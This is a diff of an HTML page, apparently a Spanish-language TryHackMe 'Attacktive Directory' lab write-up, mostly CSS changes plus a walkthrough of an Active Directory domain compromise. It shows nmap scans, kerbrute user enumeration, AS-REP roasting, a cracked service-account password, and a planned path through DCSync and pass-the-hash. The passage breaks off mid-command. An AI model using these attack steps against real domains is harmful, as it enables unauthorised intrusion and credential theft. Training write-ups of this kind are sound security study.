@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-
 <html lang="es">
 <head>
 <meta charset="UTF-8"/>
@@ -16,221 +15,90 @@
 }
 html { scroll-behavior: smooth; }
 body { background: var(--bg); color: var(--text); font-family: var(--sans); min-height: 100vh; }
-
-/* ── NAV ── */
-nav {
-position: sticky; top: 0; z-index: 100; background: var(–bg);
-border-bottom: 1px solid var(–border); padding: 0 2rem;
-display: flex; align-items: center; justify-content: space-between; height: 56px;
-}
-.nav-logo { font-size: 1rem; font-weight: 800; letter-spacing: -0.02em; text-decoration: none; color: var(–text); }
-.nav-logo span { color: var(–accent); }
+nav { position: sticky; top: 0; z-index: 100; background: var(--bg); border-bottom: 1px solid var(--border); padding: 0 2rem; display: flex; align-items: center; justify-content: space-between; height: 56px; }
+.nav-logo { font-size: 1rem; font-weight: 800; letter-spacing: -0.02em; text-decoration: none; color: var(--text); }
+.nav-logo span { color: var(--accent); }
 .nav-links { display: flex; gap: 2rem; align-items: center; }
-.nav-links a {
-font-family: var(–mono); font-size: 0.75rem; color: var(–muted);
-text-decoration: none; letter-spacing: 0.05em; transition: color 0.2s;
-}
-.nav-links a:hover { color: var(–text); }
+.nav-links a { font-family: var(--mono); font-size: 0.75rem; color: var(--muted); text-decoration: none; letter-spacing: 0.05em; transition: color 0.2s; }
+.nav-links a:hover { color: var(--text); }
 .nav-writeup-nav { display: flex; gap: 0.5rem; }
-.nav-btn {
-font-family: var(–mono); font-size: 0.68rem; padding: 0.3rem 0.8rem;
-border: 1px solid var(–border); background: none; color: var(–muted);
-cursor: pointer; text-decoration: none; letter-spacing: 0.04em;
-transition: all 0.15s; display: flex; align-items: center; gap: 0.3rem;
-}
-.nav-btn:hover { border-color: var(–text); color: var(–text); }
-.nav-btn.next { background: var(–accent); border-color: var(–accent); color: #fff; }
-.nav-btn.next:hover { background: #a83616; border-color: #a83616; }
-
-/* ── HERO ── */
-.writeup-hero {
-max-width: 1100px; margin: 0 auto;
-padding: 4rem 2rem 3rem; border-bottom: 1px solid var(–border);
-}
-.hero-meta {
-display: flex; gap: 1rem; align-items: center; flex-wrap: wrap; margin-bottom: 1.5rem;
-}
-.platform-badge {
-font-family: var(–mono); font-size: 0.62rem; letter-spacing: 0.1em;
-text-transform: uppercase; padding: 0.25rem 0.7rem;
-border: 1px solid var(–border); color: var(–muted);
-}
-.platform-badge.thm { border-color: #c11111; color: #c11111; background: #fff5f5; }
-.difficulty-badge {
-font-family: var(–mono); font-size: 0.62rem; letter-spacing: 0.1em;
-text-transform: uppercase; padding: 0.25rem 0.7rem;
-background: var(–tag-bg); color: var(–muted);
-}
-.writeup-hero h1 {
-font-size: clamp(2rem, 4vw, 3.2rem); font-weight: 800;
-letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 0.6rem;
-}
-.writeup-hero .subtitle {
-font-family: var(–mono); font-size: 0.82rem; color: var(–muted); margin-bottom: 1.5rem;
-}
-.hero-stats {
-display: flex; gap: 2rem; flex-wrap: wrap;
-padding-top: 1.5rem; border-top: 1px solid var(–border);
-}
+.nav-btn { font-family: var(--mono); font-size: 0.68rem; padding: 0.3rem 0.8rem; border: 1px solid var(--border); background: none; color: var(--muted); cursor: pointer; text-decoration: none; letter-spacing: 0.04em; transition: all 0.15s; display: flex; align-items: center; gap: 0.3rem; }
+.nav-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-btn.next { background: var(--tag-bg); }
+.writeup-hero { max-width: 1100px; margin: 0 auto; padding: 4rem 2rem 3rem; border-bottom: 1px solid var(--border); }
+.hero-meta { display: flex; gap: 1rem; align-items: center; flex-wrap: wrap; margin-bottom: 1.5rem; }
+.platform-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; border: 1px solid var(--border); color: var(--muted); }
+.platform-badge.thm { border-color: #e42c2c; color: #b31c1c; background: #fff5f5; }
+.difficulty-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; background: var(--tag-bg); color: var(--muted); }
+.writeup-hero h1 { font-size: clamp(2rem, 4vw, 3.2rem); font-weight: 800; letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 0.6rem; }
+.writeup-hero .subtitle { font-family: var(--mono); font-size: 0.82rem; color: var(--muted); margin-bottom: 1.5rem; }
+.hero-stats { display: flex; gap: 2rem; flex-wrap: wrap; padding-top: 1.5rem; border-top: 1px solid var(--border); }
 .stat { display: flex; flex-direction: column; gap: 0.2rem; }
-.stat-label { font-family: var(–mono); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(–muted); }
-.stat-value { font-family: var(–mono); font-size: 0.82rem; font-weight: 500; color: var(–text); }
-
-/* ── LAYOUT ── */
-.writeup-layout {
-max-width: 1100px; margin: 0 auto; padding: 3rem 2rem 6rem;
-display: grid; grid-template-columns: 220px 1fr; gap: 3rem;
-}
-@media (max-width: 768px) {
-.writeup-layout { grid-template-columns: 1fr; }
-.sidebar { display: none; }
-}
-
-/* ── SIDEBAR ── */
+.stat-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); }
+.stat-value { font-family: var(--mono); font-size: 0.82rem; font-weight: 500; color: var(--text); }
+.writeup-layout { max-width: 1100px; margin: 0 auto; padding: 3rem 2rem 6rem; display: grid; grid-template-columns: 220px 1fr; gap: 3rem; }
+@media (max-width: 768px) { .writeup-layout { grid-template-columns: 1fr; } .sidebar { display: none; } }
 .sidebar { position: sticky; top: 76px; align-self: start; }
-.sidebar-title {
-font-family: var(–mono); font-size: 0.6rem; letter-spacing: 0.12em;
-text-transform: uppercase; color: var(–muted); margin-bottom: 1rem;
-padding-bottom: 0.5rem; border-bottom: 1px solid var(–border);
-}
+.sidebar-title { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); margin-bottom: 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
 .sidebar-nav { display: flex; flex-direction: column; gap: 0.1rem; }
-.sidebar-link {
-font-family: var(–mono); font-size: 0.68rem; color: var(–muted);
-text-decoration: none; padding: 0.35rem 0.7rem; border-left: 2px solid transparent;
-transition: all 0.15s; letter-spacing: 0.02em;
-}
-.sidebar-link:hover { color: var(–text); border-left-color: var(–accent); background: var(–tag-bg); }
-.sidebar-link.active { color: var(–accent); border-left-color: var(–accent); }
-
-/* ── CONTENT ── */
+.sidebar-link { font-family: var(--mono); font-size: 0.68rem; color: var(--muted); text-decoration: none; padding: 0.35rem 0.7rem; border-left: 2px solid transparent; transition: all 0.15s; letter-spacing: 0.02em; }
+.sidebar-link:hover { color: var(--text); border-left-color: var(--accent); background: var(--tag-bg); }
+.sidebar-link.active { color: var(--accent); border-left-color: var(--accent); }
 .writeup-content { min-width: 0; }
-.section {
-margin-bottom: 3.5rem; padding-bottom: 3.5rem;
-border-bottom: 1px solid var(–border);
-}
+.section { margin-bottom: 3.5rem; padding-bottom: 3.5rem; border-bottom: 1px solid var(--border); }
 .section:last-child { border-bottom: none; }
-.section-label {
-font-family: var(–mono); font-size: 0.6rem; letter-spacing: 0.12em;
-text-transform: uppercase; color: var(–accent); margin-bottom: 0.5rem;
-}
-.section h2 {
-font-size: 1.6rem; font-weight: 800; letter-spacing: -0.02em;
-margin-bottom: 1.2rem; line-height: 1.2;
-}
-.section p {
-font-family: var(–mono); font-size: 0.78rem; line-height: 1.9;
-color: #3d3b36; margin-bottom: 0.8rem;
-}
+.section-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--accent); margin-bottom: 0.5rem; }
+.section h2 { font-size: 1.6rem; font-weight: 800; letter-spacing: -0.02em; margin-bottom: 1.2rem; line-height: 1.2; }
+.section h3 { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin: 1.8rem 0 0.7rem; }
+.section p { font-family: var(--mono); font-size: 0.78rem; line-height: 1.9; color: #3d3b36; margin-bottom: 0.8rem; }
 .section ul { list-style: none; padding: 0; margin-bottom: 1rem; }
-.section ul li {
-font-family: var(–mono); font-size: 0.76rem; line-height: 1.8;
-color: #3d3b36; padding-left: 1.2rem; position: relative; margin-bottom: 0.2rem;
-}
-.section ul li::before {
-content: ‘→’; position: absolute; left: 0;
-color: var(–accent); font-size: 0.65rem; top: 0.05rem;
-}
-
-/* ── ATTACK STEP ── */
-.attack-step {
-margin-bottom: 2.5rem; padding: 1.5rem;
-border: 1px solid var(–border); background: var(–surface); position: relative;
-}
-.attack-step::before {
-content: ‘’; position: absolute; top: 0; left: 0;
-width: 3px; height: 100%; background: var(–accent);
-}
-.step-num {
-font-family: var(–mono); font-size: 0.6rem; letter-spacing: 0.12em;
-color: var(–accent); text-transform: uppercase; margin-bottom: 0.4rem;
-}
-.step-title {
-font-size: 1rem; font-weight: 700; letter-spacing: -0.01em;
-margin-bottom: 0.8rem; line-height: 1.3;
-}
-.step-desc {
-font-family: var(–mono); font-size: 0.75rem; color: #3d3b36;
-line-height: 1.8; margin-bottom: 0.8rem;
-}
-
-/* ── CODE ── */
-pre {
-background: #1a1917; color: #e8e4d9; font-family: var(–mono);
-font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0;
-overflow-x: auto; line-height: 1.8; border-left: 3px solid var(–accent);
-}
+.section ul li { font-family: var(--mono); font-size: 0.76rem; line-height: 1.8; color: #3d3b36; padding-left: 1.2rem; position: relative; margin-bottom: 0.2rem; }
+.section ul li::before { content: '→'; position: absolute; left: 0; color: var(--accent); font-size: 0.65rem; top: 0.05rem; }
+.attack-step { margin-bottom: 2.5rem; padding: 1.5rem 1.8rem; border: 1px solid var(--border); background: var(--surface); position: relative; }
+.attack-step::before { content: ''; position: absolute; top: 0; left: 0; width: 3px; height: 100%; background: var(--accent); }
+.step-num { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; color: var(--accent); text-transform: uppercase; margin-bottom: 0.4rem; }
+.step-title { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin-bottom: 1rem; line-height: 1.3; }
+.step-desc { font-family: var(--mono); font-size: 0.76rem; color: #3d3b36; line-height: 1.9; margin-bottom: 0.9rem; }
+.step-h3 { font-family: var(--sans); font-size: 0.88rem; font-weight: 700; margin: 1.4rem 0 0.6rem; color: var(--text); }
+pre { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; overflow-x: auto; line-height: 1.8; border-left: 3px solid var(--accent); }
+code { font-family: var(--mono); font-size: 0.78em; background: var(--tag-bg); padding: 0.1em 0.35em; border-radius: 2px; }
 .cmd-comment { color: #6b7280; }
 .cmd-flag { color: #60a5fa; }
 .cmd-value { color: #34d399; }
 .cmd-tool { color: #f87171; }
-
-/* ── FINDINGS TABLE ── */
-.findings-table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-family: var(–mono); font-size: 0.72rem; }
-.findings-table th {
-text-align: left; padding: 0.6rem 0.8rem; background: var(–tag-bg);
-font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase;
-color: var(–muted); border-bottom: 2px solid var(–border);
-}
-.findings-table td {
-padding: 0.7rem 0.8rem; border-bottom: 1px solid var(–border);
-color: #3d3b36; vertical-align: top;
-}
-.findings-table tr:hover td { background: var(–tag-bg); }
-.severity {
-display: inline-block; font-size: 0.6rem; letter-spacing: 0.08em;
-padding: 0.15rem 0.5rem; font-weight: 600;
-}
+.callout { background: var(--tag-bg); border-left: 3px solid var(--accent2); padding: 1rem 1.2rem; margin: 1rem 0; font-family: var(--mono); font-size: 0.74rem; line-height: 1.8; color: #3d3b36; }
+.callout strong { color: var(--accent2); }
+.callout-warn { border-left-color: var(--accent); }
+.callout-warn strong { color: var(--accent); }
+.findings-table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-family: var(--mono); font-size: 0.72rem; }
+.findings-table th { text-align: left; padding: 0.6rem 0.8rem; background: var(--tag-bg); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); border-bottom: 2px solid var(--border); }
+.findings-table td { padding: 0.7rem 0.8rem; border-bottom: 1px solid var(--border); color: #3d3b36; vertical-align: top; }
+.findings-table tr:hover td { background: var(--tag-bg); }
+.severity { display: inline-block; font-size: 0.6rem; letter-spacing: 0.08em; padding: 0.15rem 0.5rem; font-weight: 600; }
 .sev-high { background: #fee2e2; color: #991b1b; }
 .sev-medium { background: #fef3c7; color: #92400e; }
 .sev-info { background: #e0f2fe; color: #0c4a6e; }
-
-/* ── TAGS ── */
 .tag-row { display: flex; gap: 0.4rem; flex-wrap: wrap; margin-top: 1rem; }
-.tag {
-font-family: var(–mono); font-size: 0.6rem; padding: 0.18rem 0.5rem;
-border: 1px solid var(–border); color: var(–muted); letter-spacing: 0.04em;
-}
-
-/* ── CREDENTIALS BOX ── */
-.creds-box {
-background: #1a1917; color: #e8e4d9; font-family: var(–mono);
-font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0;
-border-left: 3px solid #34d399; line-height: 2;
-}
+.tag { font-family: var(--mono); font-size: 0.6rem; padding: 0.18rem 0.5rem; border: 1px solid var(--border); color: var(--muted); letter-spacing: 0.04em; }
+.creds-box { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; border-left: 3px solid #34d399; line-height: 2; }
 .cred-label { color: #6b7280; }
 .cred-user { color: #60a5fa; }
 .cred-pass { color: #34d399; }
-
-/* ── WRITEUP NAV BOTTOM ── */
-.writeup-nav-bottom {
-display: flex; justify-content: space-between; align-items: center;
-padding-top: 2rem; margin-top: 2rem; border-top: 1px solid var(–border);
-}
-.nav-link-btn {
-font-family: var(–mono); font-size: 0.72rem; color: var(–muted);
-text-decoration: none; padding: 0.6rem 1rem; border: 1px solid var(–border);
-display: flex; align-items: center; gap: 0.5rem; transition: all 0.15s;
-}
-.nav-link-btn:hover { border-color: var(–text); color: var(–text); }
-.nav-link-btn.next-page { background: var(–accent); border-color: var(–accent); color: #fff; }
-.nav-link-btn.next-page:hover { background: #a83616; }
-
-/* ── FOOTER ── */
-footer {
-border-top: 1px solid var(–border); padding: 2rem; text-align: center;
-font-family: var(–mono); font-size: 0.68rem; color: var(–muted); letter-spacing: 0.06em;
-}
+.writeup-nav-bottom { display: flex; justify-content: space-between; align-items: center; padding-top: 2rem; margin-top: 2rem; border-top: 1px solid var(--border); }
+.nav-link-btn { font-family: var(--mono); font-size: 0.72rem; color: var(--muted); text-decoration: none; padding: 0.6rem 1rem; border: 1px solid var(--border); display: flex; align-items: center; gap: 0.5rem; transition: all 0.15s; }
+.nav-link-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-link-btn.next-page { background: var(--tag-bg); }
+footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; font-family: var(--mono); font-size: 0.68rem; color: var(--muted); letter-spacing: 0.06em; }
 </style>
-
 </head>
 <body>
 
 <nav>
-  <a class="nav-logo" href="../index.html">OJM<span>.</span>SEC</a>
+  <a class="nav-logo" href="index.html">OJM<span>.</span>SEC</a>
   <div class="nav-links">
-    <a href="../index.html">← Volver</a>
+    <a href="index.html">← Volver</a>
     <div class="nav-writeup-nav">
-      <a class="nav-btn" href="../index.html#writeups">Todos</a>
+      <a class="nav-btn" href="index.html#writeups">Todos</a>
       <a class="nav-btn next" href="overwatch.html">Overwatch →</a>
     </div>
   </div>
@@ -240,334 +108,524 @@ font-family: var(–mono); font-size: 0.68rem; color: var(–muted); letter-spac
   <div class="hero-meta">
     <span class="platform-badge thm">TryHackMe</span>
     <span class="difficulty-badge">Active Directory</span>
-    <span class="difficulty-badge">Black-box</span>
-    <span class="difficulty-badge">Feb 7, 2026</span>
+    <span class="difficulty-badge">Windows Server 2019</span>
+    <span class="difficulty-badge">7 Feb 2026</span>
   </div>
-  <h1>Attacktive Directory</h1>
-  <p class="subtitle">Spookysec Ltd. — Full Domain Compromise · SPOOKYSEC.LOCAL</p>
+  <h1>Spookysec Ltd.</h1>
+  <p class="subtitle">Attacktive Directory — Domain Admin via AS-REP Roasting + DCSync + Pass-the-Hash</p>
   <div class="hero-stats">
-    <div class="stat">
-      <span class="stat-label">Target</span>
-      <span class="stat-value">10.80.160.0/24</span>
-    </div>
-    <div class="stat">
-      <span class="stat-label">Domain</span>
-      <span class="stat-value">spookysec.local</span>
-    </div>
-    <div class="stat">
-      <span class="stat-label">Findings</span>
-      <span class="stat-value">7 (5 High, 1 Med, 1 Info)</span>
-    </div>
-    <div class="stat">
-      <span class="stat-label">Resultado</span>
-      <span class="stat-value">Domain Admin · NTDS.dit dumpeado</span>
-    </div>
-    <div class="stat">
-      <span class="stat-label">Autor</span>
-      <span class="stat-value">Oriol Jaen Mirabet</span>
-    </div>
+    <div class="stat"><span class="stat-label">Target IP</span><span class="stat-value">10.10.X.X</span></div>
+    <div class="stat"><span class="stat-label">Domain</span><span class="stat-value">spookysec.local</span></div>
+    <div class="stat"><span class="stat-label">DC Hostname</span><span class="stat-value">AttacktiveDirectory</span></div>
+    <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Windows Server 2019</span></div>
+    <div class="stat"><span class="stat-label">Findings</span><span class="stat-value">7 (5 High, 1 Med, 1 Info)</span></div>
+    <div class="stat"><span class="stat-label">Resultado</span><span class="stat-value">Domain Administrator</span></div>
+    <div class="stat"><span class="stat-label">Autor</span><span class="stat-value">Oriol Jaen Mirabet</span></div>
   </div>
 </div>
 
 <div class="writeup-layout">
-
-  <!-- SIDEBAR -->
-
   <aside class="sidebar">
     <div class="sidebar-title">Contenido</div>
     <nav class="sidebar-nav">
       <a class="sidebar-link" href="#resumen">Resumen ejecutivo</a>
-      <a class="sidebar-link" href="#alcance">Alcance</a>
-      <a class="sidebar-link" href="#attack-chain">Attack Chain</a>
+      <a class="sidebar-link" href="#nmap">01 · Nmap & Recon</a>
+      <a class="sidebar-link" href="#kerbrute">02 · Kerbrute user enum</a>
+      <a class="sidebar-link" href="#asrep">03 · AS-REP Roasting</a>
+      <a class="sidebar-link" href="#hashcat">04 · Hashcat cracking</a>
+      <a class="sidebar-link" href="#smb">05 · SMB enum</a>
+      <a class="sidebar-link" href="#backup">06 · Backup creds</a>
+      <a class="sidebar-link" href="#dcsync">07 · DCSync</a>
+      <a class="sidebar-link" href="#pth">08 · Pass-the-Hash</a>
       <a class="sidebar-link" href="#findings">Findings</a>
       <a class="sidebar-link" href="#creds">Credenciales</a>
       <a class="sidebar-link" href="#remediation">Remediación</a>
-      <a class="sidebar-link" href="#tools">Herramientas</a>
     </nav>
   </aside>
 
-  <!-- CONTENT -->
-
   <main class="writeup-content">
 
-```
-<!-- RESUMEN -->
-<section class="section" id="resumen">
-  <div class="section-label">01 — Overview</div>
-  <h2>Resumen Ejecutivo</h2>
-  <p>Spookysec Ltd. contrató a Oriol Jaen Mirabet para realizar un pentest interno sobre el dominio <strong>SPOOKYSEC.LOCAL</strong> bajo un enfoque de caja negra, sin credenciales ni conocimiento previo del entorno. Las pruebas se realizaron el 7 de febrero de 2026.</p>
-  <p>Se identificaron <strong>7 findings</strong> que representan un riesgo material para la confidencialidad, integridad y disponibilidad del entorno. Ningún finding se debió a CVEs o parches pendientes: todos son consecuencia de misconfiguraciones de Active Directory, gestión inadecuada de privilegios y contraseñas débiles.</p>
-  <p>El tester obtuvo acceso completo de <strong>Domain Administrator</strong> volcando el NTDS.dit completo mediante un ataque DCSync, comprometiendo los hashes NTLM de todos los usuarios del dominio incluyendo Administrator.</p>
-</section>
+    <!-- RESUMEN -->
+    <section class="section" id="resumen">
+      <div class="section-label">00 — Overview</div>
+      <h2>Resumen Ejecutivo</h2>
+      <p>Attacktive Directory es la room de TryHackMe de Spookysec Ltd. — una introducción práctica al pentesting de Active Directory que encadena varias de las técnicas más relevantes del arsenal AD moderno. Lo que hace interesante a esta caja desde el punto de vista técnico es que <strong>ningún finding se debe a vulnerabilidades sin parchear</strong>: todo el compromiso se origina en misconfiguraciones, exceso de privilegios y contraseñas débiles. Exactamente lo que te vas a encontrar en el 80% de los entornos reales.</p>
+      <p>La cadena de ataque es elegante por su simplicidad. Sin ninguna credencial inicial, se enumeran usuarios válidos del dominio aprovechando el comportamiento diferencial del protocolo Kerberos. Una cuenta de servicio con pre-autenticación deshabilitada permite obtener un hash offline. Ese hash se crackea en segundos con rockyou. Las credenciales dan acceso a un share SMB con un fichero de credenciales en Base64 (literal, no cifrado). Esas credenciales tienen permisos DCSync, lo que permite volcar todo el NTDS.dit. Con el hash del Domain Administrator se hace Pass-the-Hash y tenemos control total del dominio.</p>
+      <div class="callout">
+        <strong>Attack Path</strong><br>
+        Kerberos user enum (kerbrute) → AS-REP Roasting (svc-admin) → Hash cracking (hashcat) → SMB enum → backup share → Base64 decode → DCSync (backup account) → NTDS.dit dump → Pass-the-Hash (Administrator) → Domain Compromise
+      </div>
+    </section>
 
-<!-- ALCANCE -->
-<section class="section" id="alcance">
-  <div class="section-label">02 — Scope</div>
-  <h2>Alcance y Metodología</h2>
-  <p>Las pruebas cubrieron la red interna de Spookysec y el dominio Active Directory asociado. El enfoque fue no evasivo, buscando descubrir el mayor número posible de misconfigurations y vulnerabilidades.</p>
-  <ul>
-    <li><strong>10.80.160.0/24</strong> — Red interna Spookysec</li>
-    <li><strong>spookysec.local</strong> — Dominio Active Directory</li>
-    <li><strong>AttacktiveDirectory (10.80.160.X)</strong> — Domain Controller · Servicios: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985</li>
-  </ul>
-  <p>Metodología: reconocimiento de red → enumeración de servicios → obtención de credenciales → acceso inicial → escalada de privilegios hasta Domain Admin.</p>
-</section>
+    <!-- NMAP -->
+    <section class="section" id="nmap">
+      <div class="section-label">01 — Recon</div>
+      <h2>Nmap — Identificación del Domain Controller</h2>
 
-<!-- ATTACK CHAIN -->
-<section class="section" id="attack-chain">
-  <div class="section-label">03 — Attack Chain</div>
-  <h2>Cadena de Compromiso</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 01 · Port Scan</div>
+        <div class="step-title">Fingerprinting del DC y mapeo de superficie de ataque</div>
+        <p class="step-desc">El escaneo inicial confirma que el objetivo es un Domain Controller. El conjunto de puertos es el mismo que en cualquier DC Windows: DNS, Kerberos, LDAP, SMB, WinRM. Cada uno de estos servicios es un posible vector de entrada.</p>
 
-  <div class="attack-step">
-    <div class="step-num">Paso 01 · Recon</div>
-    <div class="step-title">Enumeración de usuarios Kerberos con kerbrute</div>
-    <p class="step-desc">Sin ninguna credencial, se realizó enumeración de usuarios válidos del dominio aprovechando la respuesta diferencial del KDC Kerberos ante usuarios válidos vs. inválidos. Se identificó la cuenta <strong>svc-admin</strong> como objetivo prioritario.</p>
-    <pre><span class="cmd-tool">./kerbrute_linux_amd64</span> userenum <span class="cmd-flag">--dc</span> <span class="cmd-value">spookysec.local</span> <span class="cmd-flag">-d</span> spookysec.local userlist.txt
-```
+        <pre><span class="cmd-tool">nmap</span> <span class="cmd-flag">-p-</span> --open <span class="cmd-flag">-sS</span> --min-rate 5000 <span class="cmd-flag">-n -Pn</span> 10.10.X.X
 
-[+] VALID USERNAME: james@spookysec.local
+PORT     STATE  SERVICE
+53/tcp   open   domain
+88/tcp   open   kerberos-sec
+135/tcp  open   msrpc
+139/tcp  open   netbios-ssn
+389/tcp  open   ldap
+445/tcp  open   microsoft-ds
+464/tcp  open   kpasswd5
+593/tcp  open   http-rpc-epmap
+636/tcp  open   ldapssl
+3268/tcp open   globalcatLDAP
+3269/tcp open   globalcatLDAPssl
+3389/tcp open   ms-wbt-server
+<span class="cmd-value">5985/tcp open   wsman</span>        <span class="cmd-comment">← WinRM disponible</span>
+9389/tcp open   adws</pre>
+
+        <pre><span class="cmd-comment"># Detección de versiones en puertos clave</span>
+<span class="cmd-tool">nmap</span> <span class="cmd-flag">-sCV</span> <span class="cmd-flag">-p</span> 88,389,445,5985 10.10.X.X
+
+88/tcp  open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp open  ldap          Microsoft Windows AD LDAP
+  ldapServiceName: spookysec.local:attacktivedirectory$@SPOOKYSEC.LOCAL
+  rootDomainNamingContext: DC=spookysec,DC=local
+
+445/tcp open  microsoft-ds  Windows Server 2019 Standard 17763
+  smb2-security-mode:
+    3.1.1:
+      <span class="cmd-value">Message signing enabled and required</span>  <span class="cmd-comment">← SMB signing activo</span>
+
+<span class="cmd-comment"># Añadir al /etc/hosts</span>
+echo "<span class="cmd-value">10.10.X.X  spookysec.local AttacktiveDirectory.spookysec.local</span>" >> /etc/hosts</pre>
+
+        <div class="callout">
+          <strong>Nota sobre SMB Signing</strong><br>
+          SMB signing activo (y requerido) cierra la puerta a ataques de relay NTLM clásicos como Responder + ntlmrelayx. Sin embargo, esto no afecta a las técnicas que usaremos — Kerberos user enum y AS-REP Roasting operan directamente sobre el puerto 88, no sobre SMB.
+        </div>
+      </div>
+    </section>
+
+    <!-- KERBRUTE -->
+    <section class="section" id="kerbrute">
+      <div class="section-label">02 — User Enumeration</div>
+      <h2>Kerbrute — Enumeración de usuarios sin autenticación</h2>
+
+      <div class="attack-step">
+        <div class="step-num">Fase 02 · Kerberos User Enumeration</div>
+        <div class="step-title">Aprovechando el comportamiento diferencial del KDC</div>
+        <p class="step-desc">Kerberos tiene un "defecto de diseño" bien conocido: el Key Distribution Center (KDC) responde de manera diferente ante una petición AS-REQ para un usuario <em>válido</em> versus uno <em>inválido</em>. Para un usuario válido que tiene pre-autenticación activada, el KDC responde con <code>KDC_ERR_PREAUTH_REQUIRED</code>. Para un usuario que no existe en el directorio, responde con <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>. Esta diferencia permite confirmar si un username existe sin necesitar contraseña ni ninguna otra credencial.</p>
+        <p class="step-desc">Kerbrute automatiza esta consulta a alta velocidad. Uso la wordlist <code>userlist.txt</code> del repositorio del room, que contiene miles de nombres de usuario comunes:</p>
+
+        <pre><span class="cmd-tool">./kerbrute_linux_amd64</span> userenum \
+    <span class="cmd-flag">--dc</span> spookysec.local \
+    <span class="cmd-flag">-d</span> spookysec.local \
+    userlist.txt \
+    <span class="cmd-flag">-t</span> 40
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 - Ronnie Flathers @ropnop
+
+2026/02/07 12:32:00 &gt; Using KDC(s): spookysec.local:88
+
+[+] VALID USERNAME: <span class="cmd-value">james@spookysec.local</span>
 [+] VALID USERNAME: <span class="cmd-value">svc-admin@spookysec.local</span>
-[+] VALID USERNAME: robin@spookysec.local
-[+] VALID USERNAME: backup@spookysec.local
-[+] Done! Tested 73317 usernames (18 valid) in 312.539 seconds</pre>
-</div>
+[+] VALID USERNAME: <span class="cmd-value">James@spookysec.local</span>
+[+] VALID USERNAME: <span class="cmd-value">robin@spookysec.local</span>
+[+] VALID USERNAME: <span class="cmd-value">darkstar@spookysec.local</span>
+[+] VALID USERNAME: <span class="cmd-value">administrator@spookysec.local</span>
+[+] VALID USERNAME: <span class="cmd-value">backup@spookysec.local</span>
+[+] VALID USERNAME: <span class="cmd-value">paradox@spookysec.local</span>
+[+] VALID USERNAME: <span class="cmd-value">JAMES@spookysec.local</span>
+[+] VALID USERNAME: <span class="cmd-value">ori@spookysec.local</span>
+[+] VALID USERNAME: <span class="cmd-value">DARKSTAR@spookysec.local</span>
+[+] VALID USERNAME: <span class="cmd-value">Robin@spookysec.local</span>
 
-```
-  <div class="attack-step">
-    <div class="step-num">Paso 02 · Exploitation</div>
-    <div class="step-title">AS-REP Roasting — Obtención del hash de svc-admin</div>
-    <p class="step-desc">La cuenta <strong>svc-admin</strong> tenía el flag <code>UF_DONT_REQUIRE_PREAUTH</code> activo en Active Directory. Esto permite a cualquier atacante en la red solicitar un ticket AS-REP cifrado con la clave derivada de la contraseña del usuario, sin necesidad de autenticación previa.</p>
-    <pre><span class="cmd-tool">python3 GetNPUsers.py</span> spookysec.local/ <span class="cmd-flag">-usersfile</span> valid_users.txt <span class="cmd-flag">-no-pass</span> <span class="cmd-flag">-dc-ip</span> 10.10.181.132
-```
+Done! Tested 73317 usernames (16 valid) in 312.539 seconds</pre>
 
-[-] User james doesn’t have UF_DONT_REQUIRE_PREAUTH set
-<span class="cmd-value">$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a62a1f7d5…</span><HASH COMPLETO></pre>
-</div>
+        <p class="step-desc">16 usuarios válidos. De este listado, dos me interesan especialmente: <code>svc-admin</code> (el nombre sugiere cuenta de servicio con posibles privilegios) y <code>backup</code> (las cuentas de backup suelen tener permisos de replicación de directorio). Guardo los usuarios en un fichero limpio para el siguiente paso:</p>
 
-```
-  <div class="attack-step">
-    <div class="step-num">Paso 03 · Cracking</div>
-    <div class="step-title">Cracking offline del hash AS-REP con hashcat</div>
-    <p class="step-desc">El hash AS-REP se crackeó offline usando hashcat en modo 18200 con la wordlist rockyou.txt. La contraseña <strong>management2005</strong> se recuperó en cuestión de segundos, confirmando el uso de credenciales débiles en una cuenta de servicio con privilegios.</p>
-    <pre><span class="cmd-tool">hashcat</span> <span class="cmd-flag">-m</span> <span class="cmd-value">18200</span> svc-admin.hash /usr/share/wordlists/rockyou.txt
-```
+        <pre><span class="cmd-comment"># Extraer solo usernames para GetNPUsers.py</span>
+cat kerbrute_output.txt | grep "VALID USERNAME" | awk '{print $7}' | \
